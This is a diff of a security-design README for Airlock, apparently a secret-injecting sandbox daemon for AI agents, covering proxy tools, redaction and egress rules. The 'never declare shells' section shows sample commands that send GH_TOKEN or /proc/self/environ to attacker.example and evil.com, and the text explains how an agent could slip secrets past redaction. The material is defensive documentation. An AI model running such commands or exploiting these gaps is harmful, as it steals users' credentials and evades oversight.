@@ -135,10 +135,10 @@ The daemon generates an SBPL (Scheme-based) sandbox profile for each tool execut
   - **File-change notification is in the baseline.** `com.apple.FSEvents` is on the allowlist because every macOS file watcher goes through it — without it `node --watch`, nodemon, vite, and `cargo watch` fail, and they fail unrecognisably: libuv surfaces a failed `FSEventStreamStart` as `EMFILE: too many open files, watch` even with a 1M descriptor limit, and Bun reports `error: Error starting FSEvents stream`. The capability is notification-only: reading a changed file still goes through the filesystem rules. It does widen metadata disclosure — an event stream rooted outside the sandbox reports the *paths* of files the process cannot open — which is the accepted cost of working dev servers.
 - **Baseline filesystem reads**: `/usr/lib`, `/usr/share`, `/System`, `/Library`, `/private/etc`, `/etc`, `/dev/null`, `/dev/random`, `/dev/urandom`, and the tool binary itself (needed for TLS code signature verification).
 - **Config-declared paths**: `(allow file-read* (subpath ...))` for read paths; `(allow file-write* (subpath ...))` for write paths.
-- **Network**: three states, chosen per execution.
+- **Network**: one of three states, chosen for each execution.
   - *Full* (every ordinary tool): `network-outbound`, `system-socket`, plus DNS via `/private/var/run/mDNSResponder`. `network-bind` is scoped to `(local unix-socket)` only — tools can bind Unix domain sockets for local IPC (argocd SSO, language servers, loopback IPC) but cannot `listen()` on TCP/UDP and therefore cannot become network-reachable services.
-  - *Proxy-only* (a [proxy tool](#proxy-tools)): the single rule `(allow network-outbound (remote tcp "localhost:<port>"))`, naming the ephemeral port the daemon bound for this one execution. No blanket `network-outbound`, no `system-socket`, no mDNSResponder socket, no bind of any kind. The tool cannot resolve a name, reach a public address, or reach a different loopback port — verified empirically with `sandbox-exec` against a live listener on each. Seatbelt's `remote tcp` filter accepts only `localhost` or `*` as the host (an IP literal fails to compile), which is exactly the shape needed.
-  - *None*: not reachable from config today; the profile's `(deny default)` covers it.
+  - *Proxy-only* (a [proxy tool](#proxy-tools)): one rule, `(allow network-outbound (remote tcp "localhost:<port>"))`. `<port>` is the ephemeral port the daemon bound for this execution. There is no general `network-outbound`, no `system-socket`, no mDNSResponder socket, and no bind of any kind. So the tool cannot resolve a name, reach a public address, or reach a different loopback port. We tested each case with `sandbox-exec` against a live listener. Seatbelt's `remote tcp` filter accepts only `localhost` or `*` as the host (an IP literal does not compile). `localhost` is what this rule needs.
+  - *None*: no config produces this state today. The profile's `(deny default)` covers it.
 
 Path traversal rules (`file-read-metadata` for ancestor directories) are generated automatically.
 
@@ -155,9 +155,9 @@ The daemon uses Landlock (kernel 5.13+) with **ABI V1 and hard requirement** —
 - Read-write paths → `PathBeneath` with `AccessFs::from_all(abi)`
 - The Landlock ruleset fd is pre-built, extracted as an `OwnedFd`, and its raw integer is passed into the `pre_exec` closure (inherited across fork).
 - In the child: `prctl(PR_SET_NO_NEW_PRIVS, 1)` followed by `landlock_restrict_self` syscall.
-- **Network (proxy tools only)**: ABI V4 (kernel 6.7+) adds TCP bind/connect rules. A [proxy tool](#proxy-tools) handles both `BindTcp` and `ConnectTcp` and is granted `ConnectTcp` on the proxy's bound port alone. This is also a **hard requirement**: on a kernel older than 6.7 the exec fails rather than running the tool with unpinned egress. Ordinary tools do not handle network access rights at all, so their socket behaviour is byte-for-byte what it was before proxy tools existed.
+- **Network (proxy tools only)**: Landlock ABI V4 (kernel 6.7+) adds TCP bind and connect rules. For a [proxy tool](#proxy-tools), the ruleset handles both `BindTcp` and `ConnectTcp`, and allows `ConnectTcp` only to the proxy's port. This is also a **hard requirement**: on a kernel older than 6.7 the exec fails. The tool never runs without the port restriction. Ordinary tools do not handle network access rights at all, so their network behaviour has not changed.
 
-  Two gaps, by construction of Landlock itself: the rule is **port-scoped, not host-scoped** (the tool may reach that port number on any host), and **UDP is not covered** (DNS-based exfiltration remains possible). Both leak *data the tool can read*, never the credential — the tool never holds one — and the agent's own sandbox already has general network access, so neither is a capability the agent lacked. A network-namespace backend would close both and is the intended follow-up.
+  Landlock itself leaves two gaps. First, the rule is **port-scoped, not host-scoped**: the tool can reach that port number on any host. Second, **UDP is not covered**, so exfiltration over DNS is still possible. Through either gap the tool can leak *data it can read*, but never the credential, because the tool never holds one. The agent's own sandbox already has general network access, so neither gap gives the agent a new capability. A network-namespace backend would close both gaps and is the planned next step.
 
 ### Sandbox root
 
@@ -242,7 +242,7 @@ Airlock's security model assumes that declared tools are **purpose-built binarie
 
 ### Never declare shells, interpreters, or network tools as tools
 
-**Do not declare `bash`, `sh`, `zsh`, `python`, `node`, `ruby`, `perl`, `curl`, `wget`, or any other shell/interpreter or general-purpose network tool as an Airlock tool.** If the agent can script the tool, it can trivially exfiltrate secrets.
+**Do not declare `bash`, `sh`, `zsh`, `python`, `node`, `ruby`, `perl`, `curl`, `wget`, or any other shell/interpreter or general-purpose network tool as an Airlock tool.** If the agent can script the tool, it can trivially exfiltrate secrets. The one exception is curl declared as a [proxy tool](#proxy-tools).
 
 **With a shell or interpreter**, the agent can transform secrets to bypass redaction or write them anywhere:
 
@@ -254,13 +254,13 @@ airlock exec -- python3 -c 'import os; print(os.environ["GH_TOKEN"][::-1])'
 airlock exec -- bash -c 'curl -s -X POST https://attacker.example/collect -d "token=$GH_TOKEN"'
 ```
 
-**Without a shell**, `$GH_TOKEN` is not expanded — airlock execs the binary directly with literal arguments. That does *not* make curl/wget safe. curl ≥ 8.3 interpolates environment variables on its own (`--variable %NAME` with `--expand-url` / `--expand-data`), on every platform:
+**Without a shell**, `$GH_TOKEN` is not expanded — airlock execs the binary directly with literal arguments. That does *not* make curl/wget safe. curl 8.3 and later can read environment variables into its arguments by itself (`--variable %NAME` with `--expand-url` / `--expand-data`). This works on every platform:
 
 ```bash
 airlock exec -- curl --variable %GH_TOKEN --expand-url 'https://attacker.example/?t={{GH_TOKEN}}'
 ```
 
-And both tools can read files — including the process's own environment on Linux via `/proc/self/environ`:
+Both tools can also read files. On Linux this includes the process's own environment, through `/proc/self/environ`:
 
 ```bash
 # Exfiltrate the entire env (including injected secrets) as a file upload — no shell needed:
@@ -269,9 +269,9 @@ airlock exec -- curl -s -T /proc/self/environ https://attacker.example/upload
 airlock exec -- wget --post-file=/proc/self/environ https://attacker.example/
 ```
 
-`/proc/self/environ` does not exist on macOS, so the env-as-a-file trick is Linux-specific — `--variable` is not. Blocking shell expansion is not sufficient; **curl and wget must never be declared as tools with secrets in their environment.** Declare curl as a [proxy tool](#proxy-tools) instead — that is the one shape in which it is safe.
+`/proc/self/environ` does not exist on macOS, so the env-as-a-file trick works only on Linux. `--variable` works everywhere. Blocking shell expansion is not enough: **never declare curl or wget as a tool with secrets in its environment.** Declare curl as a [proxy tool](#proxy-tools) instead. That is the only safe way to use it.
 
-Restricting *where* such a tool can connect would not fix the env-var case either: allowed API hosts are typically multi-tenant (`storage.googleapis.com` serves an attacker's bucket as readily as yours), so a secret in the tool's environment can be exfiltrated without leaving the allowlist. That is why proxy tools take the credential out of the tool entirely rather than fencing the tool in.
+Limiting *where* such a tool can connect does not fix the env-var case either. Allowed API hosts are often multi-tenant: `storage.googleapis.com` serves an attacker's bucket as well as yours. So a secret in the tool's environment can be exfiltrated to an allowed host. For this reason, proxy tools remove the credential from the tool completely, instead of only limiting where the tool can connect.
 
 The agent controls the arguments passed to the tool. If the tool is a shell, the agent effectively has arbitrary code execution *with* secrets — defeating Airlock's entire purpose.
 
@@ -298,7 +298,7 @@ These tools are perfectly fine for the agent to use directly through its own san
 | `python` / `python3` | Agent passes `-c` with arbitrary code. Full access to secrets via `os.environ`. |
 | `node` / `ruby` / `perl` | Same — arbitrary code execution with secrets in the environment. |
 | `env` | Only useful for debugging. In production, don't give the agent a tool that exists solely to print the environment. |
-| `curl` / `wget` | Agent controls the URL. Could `POST` secrets to an attacker-controlled endpoint: `curl -d "$GH_TOKEN" https://evil.com`. curl is safe only as a [proxy tool](#proxy-tools), where it holds no secret at all. `wget` is not covered: whether it honours the CA-bundle variables the daemon sets depends on its TLS backend, and that has not been verified. |
+| `curl` / `wget` | Agent controls the URL. Could `POST` secrets to an attacker-controlled endpoint: `curl -d "$GH_TOKEN" https://evil.com`. curl is safe only as a [proxy tool](#proxy-tools), where it holds no secret. `wget` is not supported as a proxy tool: whether it reads the CA-bundle variables the daemon sets depends on its TLS backend, and we have not tested this. |
 | `grep` / `cargo` / `npm` / `make` | Don't need secrets. Let the agent run them directly — no reason to route through Airlock. |
 
 ### The rule of thumb
@@ -309,90 +309,95 @@ These tools are perfectly fine for the agent to use directly through its own san
 
 ## Proxy tools
 
-A *proxy tool* (`proxy = true` plus one or more `[[tools.<name>.routes]]`) is the one shape in which a general-purpose HTTP client can safely be an Airlock tool. Design and rationale: [docs/proxy-tools-design.md](docs/proxy-tools-design.md).
+A *proxy tool* is a tool with `proxy = true` and one or more `[[tools.<name>.routes]]`. It is the only safe way to declare a general-purpose HTTP client as an Airlock tool. Design notes: [docs/proxy-tools-design.md](docs/proxy-tools-design.md).
 
 ### The invariant
 
-> **A proxy tool never holds a secret.** The credential is attached inside the daemon, after the request has left the tool.
+> **A proxy tool never holds a secret.** The daemon attaches the credential after the request has left the tool.
 
-Config validation enforces the first half: a proxy tool whose `env` contains a `{ secret = ... }` reference is rejected at load time, as is one that tries to set `HTTP_PROXY`, `HTTPS_PROXY`, `ALL_PROXY`, `NO_PROXY`, `CURL_CA_BUNDLE`, `SSL_CERT_FILE`, `SSL_CERT_DIR`, `NODE_EXTRA_CA_CERTS` or `REQUESTS_CA_BUNDLE` (the daemon owns those). Everything the agent can extract from the tool's process — environment, files, memory — is therefore worthless.
+Config validation enforces the first part. At load time, Airlock rejects a proxy tool if its `env` contains a `{ secret = ... }` reference. It also rejects a proxy tool that sets `HTTP_PROXY`, `HTTPS_PROXY`, `ALL_PROXY`, `NO_PROXY`, `CURL_CA_BUNDLE`, `SSL_CERT_FILE`, `SSL_CERT_DIR`, `NODE_EXTRA_CA_CERTS` or `REQUESTS_CA_BUNDLE`, in any letter case, because the daemon sets these itself. So nothing the agent can extract from the tool's process (environment, files, memory) contains a secret.
 
-Egress restriction is the second layer, not the first. It is what makes the tool's reachability equal its route table; it is not what protects the credential.
+Egress restriction is the second layer, not the first. It makes the set of hosts the tool can reach equal to its routes. It does not protect the credential.
 
-### What the daemon does per execution
+### What the daemon does for each execution
 
-1. Binds a TCP listener on `127.0.0.1:0` and reads back the **actual** port. The listener lives exactly as long as the child — every exit path (normal exit, timeout, kill, client disconnect) drops it. Nothing is bound when no proxy tool is running.
-2. Generates a 32-byte random token. The tool authenticates with `Proxy-Authorization: Basic base64("airlock:<token>")`, compared in constant time; a mismatch is `407`. **This is mandatory, not optional.** Airlock's trust boundary is a `0700` Unix socket, but a loopback TCP port has no file mode — any local user can connect to it. Without the token another user could race an exec and have the daemon attach credentials to *their* requests. The token is visible to the tool, and therefore to the agent, which is fine: it grants nothing the agent does not already have via `airlock exec`.
-3. Sets `HTTPS_PROXY` / `https_proxy` / `HTTP_PROXY` / `http_proxy` / `ALL_PROXY` / `all_proxy` to `http://airlock:<token>@127.0.0.1:<port>`, `NO_PROXY` / `no_proxy` to empty, and `CURL_CA_BUNDLE` / `SSL_CERT_FILE` / `REQUESTS_CA_BUNDLE` / `NODE_EXTRA_CA_CERTS` to the CA certificate path. These are applied *after* the tool's own `env` and win over it.
-4. Builds the sandbox profile with network access pinned to that port (see [Filesystem sandboxing](#filesystem-sandboxing) for the per-platform rule).
+1. Binds a TCP listener on `127.0.0.1:0` and reads back the **actual** port. The listener lives exactly as long as the child. Every exit path (normal exit, timeout, kill, client disconnect) closes it. When no proxy tool is running, nothing is bound.
+2. Generates a random 32-byte token. The tool authenticates with `Proxy-Authorization: Basic base64("airlock:<token>")`. The proxy compares it in constant time and answers `407` on a mismatch. **The token is mandatory.** Airlock's trust boundary is a `0700` Unix socket, but a loopback TCP port has no file mode, so any local user can connect to it. Without the token, another user could connect during an exec and have the daemon attach credentials to *their* requests. The tool can see the token, and so can the agent. This is fine: the token gives nothing that the agent does not already have through `airlock exec`.
+3. Sets these environment variables:
+   - `HTTPS_PROXY` / `https_proxy` / `HTTP_PROXY` / `http_proxy` / `ALL_PROXY` / `all_proxy` to `http://airlock:<token>@127.0.0.1:<port>`.
+   - `NO_PROXY` / `no_proxy` to an empty string.
+   - `CURL_CA_BUNDLE` / `SSL_CERT_FILE` / `REQUESTS_CA_BUNDLE` / `NODE_EXTRA_CA_CERTS` to the path of the CA certificate.
 
-### What the proxy does per request
+   The daemon applies these *after* the tool's own `env`, so these values win.
+4. Builds the sandbox profile with network access limited to that port. See [Filesystem sandboxing](#filesystem-sandboxing) for the rule on each platform.
+
+### What the proxy does for each request
 
 | Condition | Result |
 |---|---|
 | `Proxy-Authorization` missing or wrong | `407` |
-| Anything other than `CONNECT` (a plain `GET http://…`) | `403` — the credential is never attached to a cleartext request |
+| Any method other than `CONNECT` (for example a plain `GET http://…`) | `403`. The proxy never attaches the credential to a cleartext request. |
 | CONNECT to a port other than 443 | `403` |
-| CONNECT to a host no route matches | `403` — deny by default |
-| Inside the tunnel: `Host` ≠ the CONNECT authority | `400` — no domain fronting |
-| Absolute-form request target inside the tunnel | `400` |
-| `Transfer-Encoding` with `Content-Length`, or a duplicated `Content-Length` | `400` — request smuggling |
-| Method/path not permitted by the route's `allow` / `deny` | `403` |
-| Path contains `.`/`..` segments, `//`, a backslash, a malformed percent-escape, or an escape that decodes to `/`, `\`, `%` or NUL | `403` — refused rather than normalized, because the upstream's normalization may differ from the matcher's |
-| The injected secret's slot is `Stale` | `502` |
-| Host resolves to any private, loopback, link-local (incl. `169.254.169.254`), CGNAT, ULA, multicast, documentation or otherwise non-routable address | `502` |
-| The upstream answers with a `Content-Encoding` other than `identity`, a transfer coding other than `chunked`, or a partial representation (`206` / `Content-Range`) | `502`, body dropped unread — see [Response redaction](#response-redaction) |
+| CONNECT to a host that no route matches | `403` (deny by default) |
+| Inside the tunnel: `Host` header ≠ the CONNECT authority | `400` (no domain fronting) |
+| Inside the tunnel: absolute-form request target | `400` |
+| `Transfer-Encoding` together with `Content-Length`, or two `Content-Length` headers | `400` (request smuggling) |
+| The route's `allow` / `deny` rules do not permit the method and path | `403` |
+| The path contains `.` or `..` segments, `//`, a backslash, a malformed percent-escape, or an escape that decodes to `/`, `\`, `%` or NUL | `403`. The proxy refuses the path instead of normalizing it, because the upstream may normalize it differently than the matcher. |
+| The slot of the injected secret is `Stale` | `502` |
+| The host resolves to a private, loopback, link-local (including `169.254.169.254`), CGNAT, ULA, multicast, documentation or other non-routable address | `502` |
+| The upstream answers with a `Content-Encoding` other than `identity`, a transfer coding other than `chunked`, or a partial response (`206` / `Content-Range`) | `502`, and the proxy drops the body unread. See [Response redaction](#response-redaction). |
 
-Rules are matched against the *percent-decoded* path, one decode per segment, because that is what the upstream routes on: `DELETE /%72epos/o/n` is `DELETE /repos/o/n` to GitHub and must hit a `deny = ["DELETE /repos/**"]` the same way. Rule literals are therefore written in decoded form and may not contain `%` themselves.
+The allow/deny rules are matched against the *percent-decoded* path, decoding each segment once, because the upstream routes on the decoded path. For example, GitHub treats `DELETE /%72epos/o/n` as `DELETE /repos/o/n`, so it must match `deny = ["DELETE /repos/**"]` in the same way. For this reason you write rules in decoded form, and a rule may not contain `%`.
 
-On the way through, every client-supplied copy of the injected header is removed before the credential is attached, as are `Proxy-Authorization`, `Proxy-Connection` and the other hop-by-hop headers. The secret is read from the secret store **per request**, so a background refresh applies to the next one. The header value is assembled into a buffer that is zeroized, never through `format!`, and is marked sensitive.
+Before the proxy attaches the credential, it removes every copy of the injected header that the client sent. It also removes `Proxy-Authorization`, `Proxy-Connection` and the other hop-by-hop headers. The proxy reads the secret from the secret store **for each request**, so a background refresh applies to the next request. The proxy builds the header value in a buffer that is zeroized after use, never with `format!`, and marks the value as sensitive.
 
-The request is also rewritten so that the response is something the redactor can read: `Accept-Encoding` is forced to `identity` whatever the tool asked for, and `Range` / `If-Range` are removed.
+The proxy also changes the request so that the redactor can read the response. It always sets `Accept-Encoding` to `identity`, whatever the tool asked for, and it removes `Range` and `If-Range`.
 
 ### Response redaction
 
-Everything the upstream sends back is redacted before it reaches the tool, with the same automaton and the same secret set (raw, base64, URL-encoded and hex variants of *every* declared secret, not just this route's) that the tool's stdout goes through:
+The proxy redacts everything the upstream sends back before it reaches the tool. It uses the same automaton and the same secret set as the tool's stdout: raw, base64, URL-encoded and hex variants of *every* declared secret, not only the secret of this route.
 
-- **All response header values** — every one of them, including `Location`, `Set-Cookie` and `WWW-Authenticate`. A value that will not rebuild after replacement is dropped rather than forwarded.
-- **The body**, streamed. Nothing is buffered beyond the partial match at the end of a frame, so a multi-gigabyte download costs what a small one costs, and the tool's own read rate is what drives the upstream read. A secret split across two upstream writes is still caught.
-- **Trailers are dropped**, not forwarded.
-- **The upstream's reason phrase is dropped.** `HTTP/1.1 200 <anything>` is a legal status line and sits outside the header map, so the tool sees the status code with the standard phrase, never the upstream's text.
+- **All response header values**, including `Location`, `Set-Cookie` and `WWW-Authenticate`. If a value is not a valid header value after replacement, the proxy drops it. It never forwards the original.
+- **The body**, streamed. The proxy buffers only a possible partial match at the end of a frame. So a multi-gigabyte download costs the same as a small one, and the tool's read rate controls the upstream read rate. A secret split across two upstream writes is still caught.
+- **Trailers** are dropped, not forwarded.
+- **The upstream's reason phrase** is dropped. `HTTP/1.1 200 <anything>` is a legal status line, and the reason phrase is outside the header map. So the tool sees the status code with the standard phrase, never the upstream's text.
 
-The redactor is taken per response from the daemon's live handle, not snapshotted when the exec started: a tool runs for minutes, the proxy injects whatever the store holds *now*, and the two generations a refresh leaves behind cover a swap that lands mid-response.
+The proxy takes the redactor from the daemon's live handle for each response. It does not use a copy taken when the exec started. A tool can run for minutes, and the proxy injects the value the store holds *now*. The redactor keeps the two newest values of a refreshed secret, so a refresh that happens in the middle of a response is still covered.
 
-Because a `[REDACTED:name]` placeholder is not the length of the secret it replaced, an upstream `Content-Length` is wrong whenever anything matches — and which it is cannot be known before the body has been read. The proxy therefore drops it for any response that has a body and lets hyper frame the response as chunked (HTTP/1.1 always supports it). A bodiless response — HEAD, `1xx`, `204`, `304` — keeps its length, which describes the representation rather than bytes on the wire, so `curl -I` still reports one.
+A `[REDACTED:name]` placeholder does not have the same length as the secret it replaces. So the upstream `Content-Length` is wrong whenever something matches, and the proxy cannot know this before it has read the body. For this reason the proxy removes `Content-Length` from every response that has a body, and hyper sends the response with chunked encoding (HTTP/1.1 always supports it). A response without a body (HEAD, `1xx`, `204`, `304`) keeps its `Content-Length`. In such a response the length describes the resource, not the bytes on the wire, so `curl -I` still shows it.
 
-Three things fail closed rather than being handled, all for the same reason — the redactor reads bytes, not formats, and Airlock adds no decoder to the response path:
+The proxy refuses three cases instead of handling them. The reason is the same for all three: the redactor matches bytes, not formats, and Airlock adds no decoder to the response path.
 
-- **Compressed responses.** `gzip`, `br`, `zstd` and `deflate` are opaque to a byte-pattern scanner. The request demands `identity`; an upstream that compresses anyway gets a `502` and its body is dropped unread.
+- **Compressed responses.** A byte-pattern scanner cannot see inside `gzip`, `br`, `zstd` or `deflate`. The request asks for `identity`. If the upstream compresses anyway, the proxy returns `502` and drops the body unread.
 - **Unknown transfer codings**, for the same reason.
-- **Byte ranges.** A range may begin in the middle of a secret, which would split the pattern across two responses the proxy never sees together while the tool reassembles the plaintext in a file. `Range` and `If-Range` are stripped from the request so the upstream sends the whole representation, and a `206` or `Content-Range` that arrives anyway is refused. Resumed and parallel-chunked downloads therefore do not work through a proxy tool.
+- **Byte ranges.** A range can start in the middle of a secret. The pattern would then be split across two responses that the proxy never sees together, while the tool joins the plaintext in a file. So the proxy removes `Range` and `If-Range` from the request, and the upstream sends the whole resource. If a `206` or `Content-Range` arrives anyway, the proxy refuses it. As a result, resumed and parallel-chunked downloads do not work through a proxy tool.
 
-There is no configuration that turns any of this off. Redaction on the output path is mandatory in Airlock, and the proxy is an output path.
+No configuration turns any of this off. Redaction on the output path is mandatory in Airlock, and the proxy is an output path.
 
-When a response had anything replaced, the audit line says so: a count of header values on the line written when the headers arrive, and a second line when the body ends carrying the body's count. Counts only — never the matched bytes.
+If the proxy replaced anything in a response, the audit log records it. When the headers arrive, the log line includes the count of redacted header values. When the body ends, a second line gives the count for the body. The log records only counts, never the matched bytes.
 
-The CONNECT authority is the single source of truth: it selects the route, names the leaf certificate the tool is shown, is the name resolved and dialled, and is the name the upstream certificate is verified against (TLS ≥ 1.2, public roots). The client's SNI is ignored entirely, so `curl --resolve`, `--connect-to`, a forged `Host` and a forged SNI cannot make any two of those disagree. DNS is resolved once and the concrete `SocketAddr` that passed the address check is the one dialled, so rebinding cannot slip between check and use.
+The CONNECT authority is the single source of truth. It selects the route. It is the name in the leaf certificate shown to the tool. It is the name the proxy resolves and connects to. It is the name the proxy verifies the upstream certificate against (TLS 1.2 or later, public roots). The proxy ignores the client's SNI completely. So `curl --resolve`, `--connect-to`, a forged `Host` header or a forged SNI cannot make any two of these disagree. The proxy resolves DNS once and connects to the exact `SocketAddr` that passed the address check, so DNS rebinding cannot change the address between the check and the connection.
 
-Each request is logged to the ring buffer: tool, method, host, path, decision and upstream status. Never a header value, and never the query string — it may carry data.
+The proxy logs each request to the ring buffer: tool, method, host, path, decision and upstream status. It never logs a header value or the query string, because the query string can contain data.
 
 ### The CA
 
-- ECDSA P-256, generated once per daemon **after** daemonization, held in memory, **never written to disk**. A restart yields a new CA; nothing needs to trust it across restarts because the only consumers are children of that daemon.
-- `CA:TRUE, pathlen:0`, plus X.509 **Name Constraints** permitting only the union of routed DNS names, so even a leaked key cannot sign for arbitrary sites. A permitted subtree also covers the apex and deeper labels (`*.example.com` admits `example.com`); route matching remains the precise gate on what actually gets minted.
-- Only the **certificate** is written, to `{sandbox_root}/airlock-ca.pem` (mode `0644`), beside `airlock.sock` and `airlock.pid`. It is removed at graceful shutdown and cleaned up as stale state at the next start.
-- The bundle handed to the tool contains **only** this CA. Every connection the tool can make is intercepted, so public roots are unnecessary — and leaving them out means a direct connection that somehow escaped the sandbox would still fail TLS.
-- Verified: Apple's system `/usr/bin/curl` 8.7.1 (SecureTransport / LibreSSL 3.3.6) honours `CURL_CA_BUNDLE` for a proxy-intercepted connection and accepts a leaf issued by the name-constrained CA. No Homebrew curl requirement.
+- ECDSA P-256. The daemon generates it once, **after** daemonization, and holds it in memory. The key is **never written to disk**. A restart creates a new CA. Nothing needs to trust the CA across restarts, because only children of the same daemon use it.
+- `CA:TRUE, pathlen:0`, plus X.509 **Name Constraints** that permit only the DNS names in the routes. So even a leaked key cannot sign certificates for other sites. A permitted subtree also covers the apex and deeper labels (`*.example.com` permits `example.com`). Route matching still decides exactly which certificates the proxy issues.
+- Only the **certificate** is written to disk, to `{sandbox_root}/airlock-ca.pem` (mode `0644`), next to `airlock.sock` and `airlock.pid`. The daemon removes it at graceful shutdown. If it is left behind, the next start removes it as stale state.
+- The bundle given to the tool contains **only** this CA. The proxy intercepts every connection the tool can make, so the tool does not need public roots. Without them, a direct connection that somehow escaped the sandbox would still fail TLS.
+- Tested: Apple's system `/usr/bin/curl` 8.7.1 (SecureTransport / LibreSSL 3.3.6) reads `CURL_CA_BUNDLE` for a connection through the proxy and accepts a leaf certificate from the name-constrained CA. Homebrew curl is not needed.
 
 ### Residual risks
 
-- **Misuse, not leakage.** The agent gets the credential's full API authority on routed hosts — broader than a purpose-built CLI. Mitigate with a narrowly scoped service account first and method/path rules second.
-- **Data exfiltration to co-tenants.** Anything the tool can read can be uploaded to an attacker's project on an allowed multi-tenant host (`storage.googleapis.com` serves every GCP customer). The credential cannot.
-- **Path rules are a convenience layer, not an authorization system.** They see the path, not the body; a `POST` allowed for one purpose may do another (`:batchUpdate`, GraphQL). IAM is the authority boundary.
-- **An upstream that *transforms* the secret is not caught.** [Response redaction](#response-redaction) closes the `curl -o` / `--dump-header` / `--trace` path for response bytes: what the tool writes to a file was already redacted, so the plaintext credential never exists inside the sandbox. What it does not catch is an upstream that reflects the secret reversed, re-chunked, or encoded in a scheme the redactor does not know — the same limitation the stdout path has always had. It also says nothing about the agent's own request data: a query string or request body the agent chose is forwarded as sent.
-- **Linux egress pinning is port-scoped and TCP-only** — see [Linux — Landlock LSM](#linux--landlock-lsm).
-- **HTTP/1.1 only.** ALPN offers `http/1.1` and nothing else; gRPC and HTTP/2-only endpoints will not work.
-- **Certificate-pinned clients break** under interception. By design.
+- **Misuse, not leakage.** The agent gets the full API permissions of the credential on the routed hosts. This is broader than a purpose-built CLI. Mitigate this first with a narrowly scoped service account, then with allow/deny rules.
+- **Data exfiltration to other tenants.** The tool can upload anything it can read to an attacker's project on an allowed multi-tenant host (`storage.googleapis.com` serves every GCP customer). It cannot upload the credential.
+- **Allow/deny rules are a convenience, not an authorization system.** They see the path, not the body. A `POST` allowed for one purpose can do something else (`:batchUpdate`, GraphQL). IAM is the real permission boundary.
+- **An upstream that *transforms* the secret is not caught.** [Response redaction](#response-redaction) closes the `curl -o` / `--dump-header` / `--trace` path for response bytes. What the tool writes to a file is already redacted, so the plaintext credential never exists inside the sandbox. Redaction does not catch an upstream that returns the secret reversed, split into pieces, or in an encoding the redactor does not know. The stdout path has the same limit. Redaction also does not apply to data the agent sends: the proxy forwards the query string and request body as the agent wrote them.
+- **Linux egress restriction is port-scoped and TCP-only.** See [Linux — Landlock LSM](#linux--landlock-lsm).
+- **HTTP/1.1 only.** ALPN offers only `http/1.1`, so gRPC and HTTP/2-only endpoints do not work.
+- **Clients that pin certificates fail** because the proxy intercepts TLS. This is by design.
 
 ## Config safety
 
@@ -444,7 +449,7 @@ A tool could write its secrets to a file in a writable sandbox path. If the agen
 
 An ordinary tool has unrestricted outbound network access. A compromised or malicious tool binary could send its secrets to an external endpoint.
 
-**Mitigation:** Only declare tools you trust. Airlock limits *which* tools receive secrets, so a compromised `ls` binary with no declared secrets can't exfiltrate anything. A [proxy tool](#proxy-tools) is the one case where egress *is* restricted — to a single loopback port, with the destination host decided by the route table — and it is also the one case where the tool holds no secret to exfiltrate.
+**Mitigation:** Only declare tools you trust. Airlock limits *which* tools receive secrets, so a compromised `ls` binary with no declared secrets can't exfiltrate anything. A [proxy tool](#proxy-tools) is the only case where egress *is* restricted: the tool can connect only to one loopback port, and the routes decide which hosts the proxy forwards to. A proxy tool also holds no secret, so it has none to exfiltrate.
 
 ### Memory inspection
 
